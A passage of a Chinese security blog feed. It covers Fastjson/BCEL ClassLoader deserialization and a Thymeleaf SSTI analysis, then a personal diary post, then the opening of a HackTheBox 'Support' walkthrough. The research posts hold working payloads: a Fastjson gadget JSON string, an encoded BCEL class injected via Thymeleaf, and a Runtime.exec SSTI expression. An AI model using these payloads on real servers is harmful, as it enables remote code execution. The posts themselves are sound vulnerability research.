（不用想着如何调用的问题，这个和&lt;code&gt;deserial()&lt;/code&gt;那个在同一个方法里）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909164526.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;JSONObject是Map的子类，在执行toString() 时会将提取类中所有的Field，自然会执行相应的 getter 方法，从某些方面来讲，这也是&lt;code&gt;toString&lt;/code&gt;链和&lt;code&gt;getter&lt;/code&gt;联系紧密的一部分原因。&lt;/p&gt;
&lt;p&gt;换句话说，只要我们把这里的key设置为了&lt;code&gt;JSONObject&lt;/code&gt;对象，然后把这个&lt;code&gt;BasicDataSource&lt;/code&gt;对象成&lt;code&gt;JSONObject&lt;/code&gt;对象的其中一个的key，就会直接调用&lt;code&gt;JSONObject&lt;/code&gt;的所有getter方法，形成闭环（适用范围还挺广的，可以记一下）。&lt;/p&gt;
&lt;p&gt;Demo如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;--------------------------------------------------------------------------------
class fastjson_dbcp {  
    public static void main(String[] argv) throws Exception{  
        JavaClass cls = Repository.lookupClass(calc.class);  
        //System.out.println(Arrays.toString(cls.getBytes()));  
        String code = Utility.encode(cls.getBytes(), true);//转换为字节码并编码为bcel字节码  
        System.out.println(code);
        String poc = &quot;{{{\&quot;aaa\&quot;:{\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;, \&quot;driverClassLoader\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;},\&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;}}:\&quot;bbb\&quot;}:\&quot;ccc\&quot;}&quot;;  
		System.out.println(poc);  
		JSON.parse(poc);
		}
}
----------------------------------------------------------------------------
public class fastjsondemo {  
    public static void main(String[] args) throws java.io.IOException{  
        String s = &quot;{\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;name\&quot;:\&quot;admin\&quot;,\&quot;age\&quot;:\&quot;16\&quot;,\&quot;map\&quot;:{}}&quot;;  
        Object jsonObject = JSON.parse(s);  
        Person person = new Person();  
        person.setAge(11);  
        person.setName(&quot;A&quot;);  
        System.out.println(person);  
    }  
}
----------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230910013238.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Thymeleaf与BCEL&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;pom.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;dependency&amp;gt;  
           &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;  
           &amp;lt;artifactId&amp;gt;spring-boot-starter-thymeleaf&amp;lt;/artifactId&amp;gt;  
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里和上面Fastjson差不多，真正的关键在于Thymeleaf这里，这就需要我们自己了解一下Thymeleaf SSTI的知识，这里不多赘述了，详情可以看我另外一篇文章，要求Thymeleaf &amp;lt; 3.0.2 的&lt;/p&gt;
&lt;p&gt;咱们直接上POC&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;::__${&quot;&quot;.getClass().forName(&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A&quot;, true, &quot;&quot;.getClass().forName(&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;).newInstance())}_______________
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Thymeleaf与SSTI</title><link>https://f4miti0n.github.io/posts/thymeleaf-ssti/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/thymeleaf-ssti/</guid><pubDate>Tue, 12 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;本科学的毕竟是软工，关于Thymeleaf多少还是了解的。就一模板引擎，和Jinja2是一个性质的东西。一些基本的使用和概念这里就不多赘述，直接开始分析。&lt;/p&gt;
&lt;h1&gt;环境准备&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;pom.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;  
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;  
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;  
    &amp;lt;parent&amp;gt;        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;  
        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;  
        &amp;lt;version&amp;gt;2.2.0.RELEASE&amp;lt;/version&amp;gt;  
        &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;  
    &amp;lt;/parent&amp;gt;  
    &amp;lt;groupId&amp;gt;com.example&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;demo&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;  
    &amp;lt;name&amp;gt;demo&amp;lt;/name&amp;gt;  
    &amp;lt;description&amp;gt;demo&amp;lt;/description&amp;gt;  
    &amp;lt;properties&amp;gt;        
    &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;  
    &amp;lt;/properties&amp;gt;
        &amp;lt;dependencies&amp;gt;
			&amp;lt;dependency&amp;gt;
				&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;  
				&amp;lt;artifactId&amp;gt;spring-boot-starter-thymeleaf&amp;lt;/artifactId&amp;gt;  
			&amp;lt;/dependency&amp;gt;
			&amp;lt;dependency&amp;gt;
				&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;  
				&amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;  
			&amp;lt;/dependency&amp;gt;  
			&amp;lt;dependency&amp;gt;
				&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;  
				&amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;  
				&amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;  
			&amp;lt;/dependency&amp;gt;
		 &amp;lt;/dependencies&amp;gt;  
    &amp;lt;build&amp;gt;    
        &amp;lt;plugins&amp;gt;   
            &amp;lt;plugin&amp;gt; 
                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;  
                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;  
            &amp;lt;/plugin&amp;gt;
        &amp;lt;/plugins&amp;gt;
    &amp;lt;/build&amp;gt;  
&amp;lt;/project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;视图解析流程分析&lt;/h1&gt;
&lt;h2&gt;封装ModelAndView对象&lt;/h2&gt;
&lt;p&gt;在Spring Boot中，ModelAndView是一个用于封装数据模型和视图名称的对象。它主要用于在控制器方法中传递数据给前端视图并指定要展示的视图。&lt;/p&gt;
&lt;p&gt;ModelAndView对象由以下两个部分组成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Model：代表数据模型，用于存储要传递给前端视图的数据。通过在Model对象中添加属性键值对，可以将数据传递给前端。这些属性可以在视图中使用，以展示数据或进行操作。在控制器方法中，我们可以使用方法参数绑定或通过调用ModelAndView对象的getModel()方法来获取Model对象，并添加属性。&lt;/li&gt;
&lt;li&gt;View：代表要展示的视图名称。视图名称是指前端页面的名称或路径。Spring Boot会根据视图名称解析对应的模板文件，将数据模型应用到该视图上，并最终返回给客户端。可以通过设置视图名称来指定要加载的视图，可以是JSP、Thymeleaf或其他前端模板。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;流程跟踪&lt;/h3&gt;
&lt;p&gt;咱们这里分析的流程发生在&lt;code&gt;DispatcherServlet#doDispatch()&lt;/code&gt;这里，着重关注一下504行的&lt;code&gt;ModelAndView&lt;/code&gt;对象封装和517行的视图渲染这里，首先跟进一下504行的&lt;code&gt;mv&lt;/code&gt;封装&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911212756.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跳过一些不甚重要的步骤，跟踪&lt;code&gt;ServletInvocableHandlerMethod#invokeAndHandle()&lt;/code&gt;方法，调用栈和方法源码如下。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911213327.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911213454.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;invokeForRequest&lt;/code&gt; 从请求中解析出具体 Controller 方法的入参，并通过反射进行调用。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public Object invokeForRequest(NativeWebRequest request, @Nullable ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception {  
    //获取请求参数，并赋值给args
    Object[] args = this.getMethodArgumentValues(request, mavContainer, providedArgs);  
    if (this.logger.isTraceEnabled()) {  
        this.logger.trace(&quot;Arguments: &quot; + Arrays.toString(args));  
    }
    //调用相应的controller处理args  
    return this.doInvoke(args);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里处理完的returnValue是返回了一串值为&lt;code&gt;index&lt;/code&gt;的字符串，也就是我们所指定的视图名称。
缩略起没起到作用的if结构，接下来就会在67行根据returnValue的值来选择处理器进行处理，再根据处理结果设置&lt;code&gt;mavContainer&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911220122.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911220733.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进一下&lt;code&gt;handlerReturnValue&lt;/code&gt;，在50行依据&lt;code&gt;returnValue&lt;/code&gt;和&lt;code&gt;returnType&lt;/code&gt;先选出了一个&lt;code&gt;handler&lt;/code&gt;，这里用到的是&lt;code&gt;ViewNameMethodReturnValueHandler&lt;/code&gt;这个&lt;code&gt;handler&lt;/code&gt;，听名词也知道这里是和视图名称有关的处理器，我们接着跟进一下54行的&lt;code&gt;handler.handleReturnValue()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911221114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;没什么需要特别注意的地方，就是会根据传来的viewName来判定是不是需要为&lt;code&gt;mavContainer&lt;/code&gt;开启重定向选项，这里因为&lt;code&gt;viewName&lt;/code&gt;中不存在&lt;code&gt;redirect:&lt;/code&gt;这个字符串，所以并未设置。整完这一套之后
相当于对&lt;code&gt;mavcontainer&lt;/code&gt;进行了一个基础的设置（&lt;code&gt;HttpStatus&lt;/code&gt;，&lt;code&gt;viewName&lt;/code&gt;，&lt;code&gt;model&lt;/code&gt;），之后要做的就是从&lt;code&gt;mavcontainer&lt;/code&gt;中获取&lt;code&gt;mav&lt;/code&gt;对象，让我们出栈回到&lt;code&gt;RequestMappingHandlerAdapter#invokeHandlerMethod()&lt;/code&gt; ，跟进一下&lt;code&gt;this.getModelAndView&lt;/code&gt;这里。我们以上的操作都是553行&lt;code&gt;RequestMappingHandlerAdapter#invokeHandlerMethod()&lt;/code&gt;搞得，上面忘提了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911222039.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911222421.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;接着跟进669行的&lt;code&gt;new ModelAndView()&lt;/code&gt;这里，为了防止忘了，可以先看看这里的参数，代码就没必要看了，至此mav对象正式创建完毕。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911223046.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911223113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;视图层处理ModelAndView对象&lt;/h2&gt;
&lt;p&gt;获取&lt;code&gt;ModelAndView&lt;/code&gt;后，回去跟&lt;code&gt;DispatcherServlet#doDispatch&lt;/code&gt;部分的517行断点处（上面图有），这里就不一步一步跟了，最终是到了&lt;code&gt;DispatcherServlet#render&lt;/code&gt;这里进行视图解析，我们跟进去看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911223912.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911224905.png&quot; alt=&quot;&quot; /&gt;
从宏观的角度浅谈一下这段代码，先通过我们传入的ViewName拿到View对象，之后再根据View对象对我们所传入的数据进行渲染，先跟进一下&lt;code&gt;resolveViewName&lt;/code&gt;这一块。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911225437.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911225734.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里会对 &lt;code&gt;viewResolvers&lt;/code&gt; 进行一个遍历，挨个尝试解析 &lt;code&gt;viewName&lt;/code&gt; ，看看哪个&lt;code&gt;viewResolver&lt;/code&gt;能给解析出来个 &lt;code&gt;view&lt;/code&gt; 给返回来。我们直接跟着这个循环进&lt;code&gt;viewResolver.resolveViewName()&lt;/code&gt;看返回的&lt;code&gt;view&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911230220.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911230050.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911230414.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里没什么好说的，&lt;code&gt;viewResolver&lt;/code&gt;会先根据&lt;code&gt;viewName&lt;/code&gt;匹配出来一个可解析的&lt;code&gt;view&lt;/code&gt;列表，再把view列表传到&lt;code&gt;getBestView&lt;/code&gt;里面挑个最合适的&lt;code&gt;view&lt;/code&gt;对象，这里是第一次循环就给挑出来了，&lt;code&gt;ThymeleafView&lt;/code&gt;，直接返回出栈。因为拿到了合适的&lt;code&gt;view&lt;/code&gt;对象，我们已经可以来到&lt;code&gt;view.render()&lt;/code&gt;这里了，在&lt;code&gt;render&lt;/code&gt;处下个断点跟进几步，最终来到了&lt;code&gt;ThymeleafView#renderFragment()&lt;/code&gt;这里，关键部分代码如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911230654.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230911233807.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;能够看到，这里是对我们传入的&lt;code&gt;viewTemplateName&lt;/code&gt;进行了判断，如果包含&lt;code&gt;::&lt;/code&gt;字符串，则进行188行的片段表达式解析，看着非常像SPEL注入的入口，顺便提一下，我们这里耀手动改一下viewTemplateName的值（前面忘改了），设其值为&lt;code&gt;index:xxx&lt;/code&gt;。之后再跟进188行，一路跟到&lt;code&gt;process()&lt;/code&gt;这里，来到我们的目的地。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230912001005.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230912001129.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230912001217.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里的input就是我们前面经过拼接处理后得到的&lt;code&gt;TemplateName&lt;/code&gt;，然后关键看我标断点处的代码，发现是对input进行了一个正则匹配，然后把匹配结果当作参数传给&lt;code&gt;parserExperssion&lt;/code&gt;最后再经过&lt;code&gt;execute&lt;/code&gt;来执行。现在，我们只需要去查一查这个正则的匹配规则，则完事备矣。查一下这里的&lt;code&gt;PREPROCESS_EVAL_PATTERN&lt;/code&gt;，详情如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230912002505.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;非常简单的一个非贪婪匹配，我们只需要在payload的前后分别加上两个_即可。
因为我们这里的是input是瞎填的，显示效果没有那么好，那假如把input这里改一改，又会发生什么呢？&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()}_______________
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It is amazing!
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Thymeleaf%20SSTI/Pasted%20image%2020230912002917.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;文末简单的总结一下利用条件，这里就直接套用别的师傅的了&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户传入的字符串拼接到了Controller方法的返回值中且返回的视图非重定向（前面流程可用知晓，重定向优先级最高），或URI路径拼接了用户的输入且Controller方法参数中不带有&lt;code&gt;ServletResponse&lt;/code&gt;类型的参数；&lt;/li&gt;
&lt;li&gt;视图引擎名称中需要包含&lt;code&gt;::&lt;/code&gt;字符串；&lt;/li&gt;
&lt;li&gt;被执行表达式字符串前后需要带有两个下划线，即&lt;code&gt;__${EL}__&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;如果POC在URI中，由于URI格式化的原因且我们的POC中带有&lt;code&gt;.&lt;/code&gt;符号，所以需要在URI末尾添加&lt;code&gt;.&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;环境上的话，得Thymeleaf的版本 &amp;lt; 3.0.2&lt;/p&gt;
</content:encoded></item><item><title>最近的生活</title><link>https://f4miti0n.github.io/posts/%E6%9C%80%E8%BF%91%E7%9A%84%E7%94%9F%E6%B4%BB/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/%E6%9C%80%E8%BF%91%E7%9A%84%E7%94%9F%E6%B4%BB/</guid><pubDate>Tue, 12 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;恍惚中，7月闲谈，已是将近两个月前的事情了。为匹配这两个月来百无聊赖的空茫时光，也为了疏散一下心中的郁积，终究还是决定把手搁在键盘上，敲一些萎靡木讷似是而非的文字，以此来记录一下近两个月的生活。&lt;/p&gt;
&lt;p&gt;时间线可以追溯到7月闲谈写完的第三天，或者说，追溯到8月的第一通电话。电话的对面是个男人，虽然并未谋面，但仅凭声音也能知道此人绝非善茬。通话的过程并不算长，你来我往之间也不过寥寥数语，是碧桂园打来的催租电话，催我交下个月的房租。挂闭电话，心里说不出是什么感受，只觉茫然而机械。按照计划来讲，这本不应该是问题，因为八月底就要开学的缘故，租期本就打算只开展一个月，住完这个月就找个酒店续续命，把工期给熬过去。非要多说有什么值得注意的地方的话，就是记得提前15天把押金给退了而已，一切就和中介安排的一样妥当。我又打去电话与中介进行了交涉，也是到此才发觉以往想当然的计划处处存在纰漏。首先第一点，提前15天把租金退了的说法，本身并不准确，这里的15天其实是中介给自己预估找到下家转租的时间，如果15天后中介并未找到下家，那么仍然需要你当个冤大头来给房东兜底交房租。除此之外，原本想的下个月房租不交，把这个月房给住满就行的想法，在此也是不成立的。住房甲乙双方的一切都要按照合同来履行，如果下个月房租没有交上，那么则将乙方判定为合同的违约人，而违约人是不享受权益的，把这个月住满？未免太天真了。自此，在成为一个合格的打工人之前，我先成为了一名合同的违约人。期间倒也想过要不然把下个月房租给交上，等着中介找转租给迂回迂回，但毕竟下个月就开学了，导员那边还无论如何都不给批假，再加上我实在信不过这个中介真能尽心尽力地帮我找接盘侠，倒也就此作罢。说到这里，也不得不感慨一下现代企业的精明之处，把催租、中介、房东合理划分为了三个模块独立运作，彼此之间扯皮推诿，口头承诺互不作数，深得三权分立之精髓。而作为此制度的战利品，或者说作为认知受限的必然代价，我和我的冤种舍友也是最终完成了这个7000块钱住15天的神话故事。在住房的第16天，也就是被赶出来的第一天，恰逢舍友出差外地，此中茫然麻木无人与说，关于那一天的记忆已经是残存模糊得不像样了，唯一能有点印象的就是那天的太阳，那么的大，那么的炙热，晒得四野不见星星生气，晒得街道只剩一阵电汽之音和我心里的一片死寂。&lt;/p&gt;
&lt;p&gt;后续就是酒店流浪生活的开端了，基本上也是无缝衔接上了这一次的hvv行动。这里就要给我的那个好舍友一点篇幅了，确实是好舍友，和我出了这档子事儿以后，虽然已经没有继续在济南工作的计划了，但还是接着和我同租酒店分担了好几天的房费。每天下班回来都能看到他萎靡不振地在床上躺尸，情绪的起伏和LK99的早寄晚导基本保持同频震荡。在流浪的初期，我们的生活质量还是有所保障的，和老板谈好了价格，一天110块钱的房费，两人均摊下来不过也就55块，寥寥无几的很，每天晚上还能点顿蜜雪冰城打打牙祭。但生活中的小确幸往往是难以温存的，在流浪生活的后期，舍友实在不堪忍受，毅然决然地离开了济南。比起陡然增加的生活费用，更难以忍受地是无人排遣的寂寞，每每躺在酒店的大床上，我总是会想到很多，老家的朋友、学校的同学、甚至是那个不爱我的前女友，但却想不到任何一个可以在网络上倾心吐胆的对象。是的。这世上，除了自己，都是外人。各人伶仃自苦，形与影相吊，心中惶惑无人能诉。况人活着还是少说为佳，每一次倾心吐胆，事后就没有不后悔的。幸而主管神机妙算，在情绪最不稳定的那几天，全给安排成了12小时的夜班，什么烦恼困苦，在看了一夜的零报警后也就都不值得一提了，整个人都被睡觉的生理本能所驱使着，胡思乱想根本无隙可入。浑浑噩噩地过了几天日子，时间在无数的低价值报告和几次hvv值班中不断蹉跎。慢慢地也让我捱到了离开公司的日子，虽然只是转远程实习了，但总归是可以离开这里了。我不知道该怎么描述那天的感觉，只记得太阳很大，很温暖。形容一下那天的进度，不夸张的说，几乎是左脚刚踏出公司大门，右脚就踏上了回程的车次。瘫在高铁的座椅上，脑子里回闪着打工的种种经历。印象最深刻的还是离职前主管和我的谈话，跟我简单地聊了聊对于今后的职业规划。说实话主管还是个挺不错的主管的，实习期间没有坑过我，但那在谈天中，我也分明听出了pua的含义，便也顾左右而言他，问啥我都对对对，谈话完毕，主管扶了扶额头，留下了一句戒备心很重的评价，便也没再说什么。在以守恒为规则的世界里，如果这句评价是碧桂园的房屋中介给的，那该有多好。&lt;/p&gt;
&lt;p&gt;高铁的终点站是我家，在家里稍做休整平复了几天心情之后，暑假就彻底的过去了。而几乎是压着返校的截止时间线，我个人新学期的故事也徐徐展开。而这个学期，我愿称其为巨变的一个学期，上学期末的实验室收回事件彻底打乱了以往的行动轨迹，为之努力两年的社团在我看来也是从那一刻起而名存实亡。我能感受到，一股无力感正在裹挟着我，如果更确切地谈，那是一种虚无感。平心而论，过去我运营的一年里，社团其实是挺有起色的，从我刚来时候的所有大赛都是颗粒无收，到现在年末能申报十几个奖，这确实是一种进步。但又能怎么样呢？一纸文件下来，一切努力统统都是白扯，徒增笑料尔。也有这个原因在吧，在这学期选会长的时候，除了退避三舍，再无别词可形容。虽然我的生活确实谈不上什么有高深的使命吧，但让我做一件在我看来完全没有意义的事情，我也是不愿意的。抛开了一切以前硬凑上来的义务，我也得以得到了一个旁观者的视角来看待这我所爱过的社团。虽然已经失去了几乎所有的权益，但学弟们还是像当时的我一样孜孜不倦地运营着整个社团。只是这个社团在我看来还是变味了，一些不该有的官僚主义从上到下开始蔓延侵吞着我心里原有的纯粹，组里的称呼从X学长变成了X组、X会长的过程，也真是令人恶心作呕。我知道学弟们可能还是会看到这篇文章，不过倒也无所谓了，怎么运营都是你们的事情。可能在我的概念里吧，生活，就是各自琢磨各自运转，各自平安喜乐各自一地鸡毛。而当生活到达某个拐点时，就开始毫无顾忌地向着一个陌生的自己和未知的世界一路狂奔，无论你想或者不想。&lt;/p&gt;
</content:encoded></item><item><title>HackTheBox:Support</title><link>https://f4miti0n.github.io/posts/hacktheboxsupport/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/hacktheboxsupport/</guid><pubDate>Tue, 05 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;运行靶机，获得IP：10.10.11.174
用nmap对该ip进行全端口扫描，得到以下关键端口信息，大体能推测这是一台仿DC的靶机
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905102556.png&quot; alt=&quot;&quot; /&gt;
因为445端口是开着的，我们先尝试用smbclient连一下，看看有没有empty password&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. smbclient -L 10.10.11.174
2. smbclient \\\\10.10.11.174\\support-tools 
3. get UserInfo.exe.zip
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里是在support-tools 的共享下发现了空密码，也是成功下载了UserInfo.exe.zip
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905103016.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
